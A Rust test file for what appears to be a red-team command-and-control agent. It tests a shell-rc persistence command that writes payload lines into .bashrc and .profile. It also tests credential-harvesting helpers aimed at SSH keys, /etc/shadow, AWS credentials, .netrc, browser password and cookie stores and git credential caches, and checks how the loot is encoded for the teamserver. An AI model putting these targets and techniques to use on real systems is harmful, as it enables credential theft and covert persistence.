use super::*;

fn persist_payload(method: u32, op: u32, command: &str) -> Vec<u8> {
    let mut p = Vec::new();
    p.extend_from_slice(&(method as i32).to_le_bytes());
    p.extend_from_slice(&(op as i32).to_le_bytes());
    if op == 0 {
        // Install: include length-prefixed command string
        let cmd_bytes = command.as_bytes();
        p.extend_from_slice(&(cmd_bytes.len() as i32).to_le_bytes());
        p.extend_from_slice(cmd_bytes);
    }
    p
}

#[tokio::test]
async fn persist_unknown_method_returns_parse_error() {
    let payload = persist_payload(99, 0, "/bin/true");
    let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
    let mut state = PhantomState::default();
    let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
    assert!(result.is_err(), "unknown method must return a parse error");
}

#[tokio::test]
async fn persist_unknown_op_returns_parse_error() {
    let payload = persist_payload(1, 99, "/bin/true");
    let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
    let mut state = PhantomState::default();
    let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
    assert!(result.is_err(), "unknown op must return a parse error");
}

#[test]
fn remove_shell_rc_block_strips_delimited_section() {
    let text = "line1\nline2\n# BEGIN # red-cell-c2\n/bin/payload\n# END # red-cell-c2\nline3\n";
    let result = remove_shell_rc_block(text, "# BEGIN # red-cell-c2", "# END # red-cell-c2");
    assert!(result.contains("line1"), "line before block must remain");
    assert!(result.contains("line3"), "line after block must remain");
    assert!(!result.contains("/bin/payload"), "command inside block must be removed");
    assert!(!result.contains("BEGIN"), "begin marker must be removed");
    assert!(!result.contains("END"), "end marker must be removed");
}

#[test]
fn remove_shell_rc_block_no_block_returns_unchanged() {
    let text = "line1\nline2\n";
    let result = remove_shell_rc_block(text, "# BEGIN # red-cell-c2", "# END # red-cell-c2");
    assert_eq!(result, "line1\nline2\n");
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn persist_shell_rc_install_writes_block_to_tempfiles() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tempdir");
    let home = tmp.path().to_str().expect("valid path").to_owned();
    // Hold the HOME_LOCK for the entire test body so that parallel tests
    // cannot overwrite HOME while this test is running.
    let _home_guard = HOME_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // SAFETY: mutation is serialised by HOME_LOCK above.
    unsafe {
        std::env::set_var("HOME", &home);
    }

    // Create stub rc files
    let bashrc = tmp.path().join(".bashrc");
    let profile = tmp.path().join(".profile");
    fs::write(&bashrc, "# existing\n").expect("write bashrc");
    fs::write(&profile, "# existing\n").expect("write profile");

    let payload = persist_payload(3, 0, "/bin/payload"); // ShellRc=3, Install=0
    let package = DemonPackage::new(DemonCommand::CommandPersist, 42, payload);
    let mut state = PhantomState::default();
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { request_id, text }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 42);
    assert!(text.contains("installed"), "callback must confirm install: {text}");

    let bashrc_content = fs::read_to_string(&bashrc).expect("read bashrc");
    assert!(bashrc_content.contains("/bin/payload"), ".bashrc must contain payload cmd");
    assert!(bashrc_content.contains("red-cell-c2"), ".bashrc must contain marker");

    let profile_content = fs::read_to_string(&profile).expect("read profile");
    assert!(profile_content.contains("/bin/payload"), ".profile must contain payload cmd");
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn persist_shell_rc_install_idempotent() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tempdir");
    let home = tmp.path().to_str().expect("valid path").to_owned();
    let _home_guard = HOME_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // SAFETY: mutation is serialised by HOME_LOCK above.
    unsafe {
        std::env::set_var("HOME", &home);
    }

    let bashrc = tmp.path().join(".bashrc");
    let profile = tmp.path().join(".profile");
    fs::write(&bashrc, "").expect("write bashrc");
    fs::write(&profile, "").expect("write profile");

    // Install once
    let payload = persist_payload(3, 0, "/bin/payload");
    let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
    let mut state = PhantomState::default();
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    let _ = state.drain_callbacks();

    // Install again — should report already present
    let payload2 = persist_payload(3, 0, "/bin/payload");
    let package2 = DemonPackage::new(DemonCommand::CommandPersist, 2, payload2);
    execute(&package2, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert!(text.contains("already present"), "second install must report already-present: {text}");

    // Verify .bashrc has exactly one block
    let content = fs::read_to_string(&bashrc).expect("read bashrc");
    assert_eq!(content.matches("red-cell-c2").count(), 2, "one BEGIN + one END marker");
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn persist_shell_rc_remove_strips_block() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tempdir");
    let home = tmp.path().to_str().expect("valid path").to_owned();
    let _home_guard = HOME_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // SAFETY: mutation is serialised by HOME_LOCK above.
    unsafe {
        std::env::set_var("HOME", &home);
    }

    let bashrc = tmp.path().join(".bashrc");
    let profile = tmp.path().join(".profile");
    fs::write(&bashrc, "").expect("write bashrc");
    fs::write(&profile, "").expect("write profile");

    // Install
    let payload = persist_payload(3, 0, "/bin/payload");
    let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
    let mut state = PhantomState::default();
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("install");
    let _ = state.drain_callbacks();

    // Remove
    let payload_rm = persist_payload(3, 1, ""); // ShellRc=3, Remove=1
    let pkg_rm = DemonPackage::new(DemonCommand::CommandPersist, 2, payload_rm);
    execute(&pkg_rm, &mut PhantomConfig::default(), &mut state).await.expect("remove");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert!(text.contains("removed"), "callback must confirm removal: {text}");

    let content = fs::read_to_string(&bashrc).expect("read bashrc");
    assert!(!content.contains("/bin/payload"), ".bashrc must not contain payload after remove");
    assert!(!content.contains("red-cell-c2"), ".bashrc must not contain marker after remove");
}

#[tokio::test]
#[allow(clippy::await_holding_lock)]
async fn persist_shell_rc_remove_when_not_present() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tempdir");
    let _home_guard = HOME_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    // SAFETY: mutation is serialised by HOME_LOCK above.
    unsafe {
        std::env::set_var("HOME", tmp.path().to_str().expect("valid path"));
    }
    fs::write(tmp.path().join(".bashrc"), "").expect("write bashrc");
    fs::write(tmp.path().join(".profile"), "").expect("write profile");

    let payload_rm = persist_payload(3, 1, "");
    let pkg_rm = DemonPackage::new(DemonCommand::CommandPersist, 5, payload_rm);
    let mut state = PhantomState::default();
    execute(&pkg_rm, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert!(text.contains("not found"), "must report not-found: {text}");
}

// ── is_private_key_bytes ──────────────────────────────────────────────

#[test]
fn is_private_key_bytes_accepts_pem_rsa_private() {
    let pem = b"-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----";
    assert!(is_private_key_bytes(pem));
}

#[test]
fn is_private_key_bytes_accepts_pem_openssh_private() {
    let pem = b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----";
    assert!(is_private_key_bytes(pem));
}

#[test]
fn is_private_key_bytes_accepts_pem_ec_private() {
    let pem = b"-----BEGIN EC PRIVATE KEY-----\ndata\n-----END EC PRIVATE KEY-----";
    assert!(is_private_key_bytes(pem));
}

#[test]
fn is_private_key_bytes_accepts_openssh_binary_magic() {
    let mut magic = b"openssh-key-v1\x00".to_vec();
    magic.extend_from_slice(b"extra payload bytes here");
    assert!(is_private_key_bytes(&magic));
}

#[test]
fn is_private_key_bytes_rejects_pem_public_key() {
    let pub_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjAN...\n-----END PUBLIC KEY-----";
    assert!(!is_private_key_bytes(pub_key));
}

#[test]
fn is_private_key_bytes_rejects_rsa_public_key() {
    let rsa_pub = b"-----BEGIN RSA PUBLIC KEY-----\ndata\n-----END RSA PUBLIC KEY-----";
    assert!(!is_private_key_bytes(rsa_pub));
}

#[test]
fn is_private_key_bytes_rejects_arbitrary_bytes() {
    assert!(!is_private_key_bytes(b"not a key at all"));
    assert!(!is_private_key_bytes(b""));
    assert!(!is_private_key_bytes(b"\x00\x01\x02\x03"));
}

// ── encode_harvest_entries ────────────────────────────────────────────
//
// The "expected" bytes are built with the same logic used by the teamserver's
// hand-coded `make_payload` helper in harvest.rs tests, so any divergence in
// byte order or length-prefix width will be caught here.

fn harvest_expected_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.extend_from_slice(&(entries.len() as u32).to_le_bytes());
    for (kind, path, data) in entries {
        buf.extend_from_slice(&(kind.len() as u32).to_le_bytes());
        buf.extend_from_slice(kind.as_bytes());
        buf.extend_from_slice(&(path.len() as u32).to_le_bytes());
        buf.extend_from_slice(path.as_bytes());
        buf.extend_from_slice(&(data.len() as u32).to_le_bytes());
        buf.extend_from_slice(data);
    }
    buf
}

#[test]
fn encode_harvest_entries_empty_produces_four_zero_bytes() {
    let result = encode_harvest_entries(&[]).expect("encode must succeed");
    assert_eq!(result, harvest_expected_payload(&[]));
    assert_eq!(result, [0u8, 0, 0, 0]);
}

#[test]
fn encode_harvest_entries_single_round_trips() {
    let entries = [HarvestEntry {
        kind: "ssh_key".to_owned(),
        path: "/home/user/.ssh/id_rsa".to_owned(),
        data: b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----"
            .to_vec(),
    }];
    let result = encode_harvest_entries(&entries).expect("encode must succeed");
    let expected = harvest_expected_payload(&[(
        "ssh_key",
        "/home/user/.ssh/id_rsa",
        b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----",
    )]);
    assert_eq!(result, expected);
}

#[test]
fn encode_harvest_entries_multiple_round_trips() {
    let entries = [
        HarvestEntry {
            kind: "shadow".to_owned(),
            path: "/etc/shadow".to_owned(),
            data: b"root:$6$hash:19000:0:99999:7:::".to_vec(),
        },
        HarvestEntry {
            kind: "credentials".to_owned(),
            path: "/root/.aws/credentials".to_owned(),
            data: b"[default]\naws_access_key_id=AKIA...".to_vec(),
        },
    ];
    let result = encode_harvest_entries(&entries).expect("encode must succeed");
    let expected = harvest_expected_payload(&[
        ("shadow", "/etc/shadow", b"root:$6$hash:19000:0:99999:7:::"),
        ("credentials", "/root/.aws/credentials", b"[default]\naws_access_key_id=AKIA..."),
    ]);
    assert_eq!(result, expected);
}

#[test]
fn encode_harvest_entries_count_field_is_little_endian_u32() {
    // Verify the leading 4 bytes encode the entry count in LE byte order.
    let entries = [
        HarvestEntry {
            kind: "shadow".to_owned(),
            path: "/etc/shadow".to_owned(),
            data: b"data".to_vec(),
        },
        HarvestEntry {
            kind: "cookie_db".to_owned(),
            path: "/home/user/.config/chromium/Default/Cookies".to_owned(),
            data: b"SQLiteDB".to_vec(),
        },
    ];
    let result = encode_harvest_entries(&entries).expect("encode must succeed");
    let count = u32::from_le_bytes(result[..4].try_into().expect("4-byte prefix"));
    assert_eq!(count, 2);
}

#[test]
fn encode_harvest_entries_field_lengths_are_little_endian_u32() {
    // Verify every length prefix inside the payload is a LE u32.
    let kind = "ssh_key";
    let path = "/home/user/.ssh/id_rsa";
    let data = b"key material";
    let entries =
        [HarvestEntry { kind: kind.to_owned(), path: path.to_owned(), data: data.to_vec() }];
    let result = encode_harvest_entries(&entries).expect("encode must succeed");

    let mut pos = 0usize;
    let read_u32_le = |buf: &[u8], p: &mut usize| -> u32 {
        let v = u32::from_le_bytes(buf[*p..*p + 4].try_into().expect("4 bytes"));
        *p += 4;
        v
    };

    let count = read_u32_le(&result, &mut pos);
    assert_eq!(count, 1);

    let kind_len = read_u32_le(&result, &mut pos) as usize;
    assert_eq!(kind_len, kind.len());
    assert_eq!(&result[pos..pos + kind_len], kind.as_bytes());
    pos += kind_len;

    let path_len = read_u32_le(&result, &mut pos) as usize;
    assert_eq!(path_len, path.len());
    assert_eq!(&result[pos..pos + path_len], path.as_bytes());
    pos += path_len;

    let data_len = read_u32_le(&result, &mut pos) as usize;
    assert_eq!(data_len, data.len());
    assert_eq!(&result[pos..pos + data_len], data);
    pos += data_len;

    assert_eq!(pos, result.len(), "no trailing bytes");
}

// ── collect_netrc ─────────────────────────────────────────────────────

#[test]
fn collect_netrc_harvests_existing_file() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let netrc_path = home.path().join(".netrc");
    fs::write(&netrc_path, b"machine example.com login user password secret\n").expect("write");

    let mut entries = Vec::new();
    collect_netrc(home.path(), &mut entries);

    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].kind, "credentials");
    assert!(entries[0].path.ends_with(".netrc"));
    assert_eq!(entries[0].data, b"machine example.com login user password secret\n");
}

#[test]
fn collect_netrc_skips_missing_file() {
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let mut entries = Vec::new();
    collect_netrc(home.path(), &mut entries);
    assert!(entries.is_empty());
}

#[test]
fn collect_netrc_skips_empty_file() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    fs::write(home.path().join(".netrc"), b"").expect("write");

    let mut entries = Vec::new();
    collect_netrc(home.path(), &mut entries);
    assert!(entries.is_empty());
}

// ── collect_browser_passwords ─────────────────────────────────────────

#[test]
fn collect_browser_passwords_harvests_chromium_login_data() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let login_data_dir = home.path().join(".config/google-chrome/Default");
    fs::create_dir_all(&login_data_dir).expect("mkdir");
    fs::write(login_data_dir.join("Login Data"), b"SQLite format 3\x00fake-login-db")
        .expect("write");

    let mut entries = Vec::new();
    collect_browser_passwords(home.path(), &mut entries);

    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].kind, "credentials");
    assert!(entries[0].path.contains("Login Data"));
}

#[test]
fn collect_browser_passwords_harvests_firefox_logins_and_key4() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let profile_dir = home.path().join(".mozilla/firefox/abc123.default");
    fs::create_dir_all(&profile_dir).expect("mkdir");
    fs::write(
        profile_dir.join("logins.json"),
        b"{\"logins\":[{\"hostname\":\"https://example.com\"}]}",
    )
    .expect("write logins.json");
    fs::write(profile_dir.join("key4.db"), b"SQLite format 3\x00fake-nss-key-db")
        .expect("write key4.db");

    let mut entries = Vec::new();
    collect_browser_passwords(home.path(), &mut entries);

    assert_eq!(entries.len(), 2, "expected both logins.json and key4.db");
    let paths: Vec<&str> = entries.iter().map(|e| e.path.as_str()).collect();
    assert!(paths.iter().any(|p| p.contains("logins.json")), "missing logins.json entry");
    assert!(paths.iter().any(|p| p.contains("key4.db")), "missing key4.db entry");
    assert!(entries.iter().all(|e| e.kind == "credentials"));
}

#[test]
fn collect_browser_passwords_firefox_logins_only_without_key4() {
    use std::fs;
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let profile_dir = home.path().join(".mozilla/firefox/xyz789.default-release");
    fs::create_dir_all(&profile_dir).expect("mkdir");
    fs::write(profile_dir.join("logins.json"), b"{\"logins\":[]}").expect("write logins.json");
    // key4.db intentionally absent

    let mut entries = Vec::new();
    collect_browser_passwords(home.path(), &mut entries);

    assert_eq!(entries.len(), 1, "should still harvest logins.json alone");
    assert!(entries[0].path.contains("logins.json"));
}

#[test]
fn collect_browser_passwords_skips_when_no_browsers() {
    use tempfile::TempDir;

    let home = TempDir::new().expect("tmpdir");
    let mut entries = Vec::new();
    collect_browser_passwords(home.path(), &mut entries);
    assert!(entries.is_empty());
}

// ── collect_git_credential_cache ──────────────────────────────────────

#[test]
fn collect_git_credential_cache_harvests_files() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tmpdir");
    let cred_file = tmp.path().join("credential");
    fs::write(&cred_file, b"protocol=https\nhost=github.com\nusername=u\npassword=p\n")
        .expect("write");

    let mut entries = Vec::new();
    collect_git_credential_cache_from(tmp.path(), &mut entries);

    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].kind, "credentials");
    assert!(entries[0].data.starts_with(b"protocol=https"));
}

#[test]
fn collect_git_credential_cache_skips_empty_and_dirs() {
    use std::fs;
    use tempfile::TempDir;

    let tmp = TempDir::new().expect("tmpdir");
    // empty file — should be skipped
    fs::write(tmp.path().join("empty"), b"").expect("write");
    // subdirectory — should be skipped
    fs::create_dir(tmp.path().join("subdir")).expect("mkdir");

    let mut entries = Vec::new();
    collect_git_credential_cache_from(tmp.path(), &mut entries);

    assert!(entries.is_empty());
}

#[test]
fn collect_git_credential_cache_missing_dir_is_noop() {
    let mut entries = Vec::new();
    collect_git_credential_cache_from(
        Path::new("/nonexistent/path/git-credential-cache"),
        &mut entries,
    );
    assert!(entries.is_empty());
}
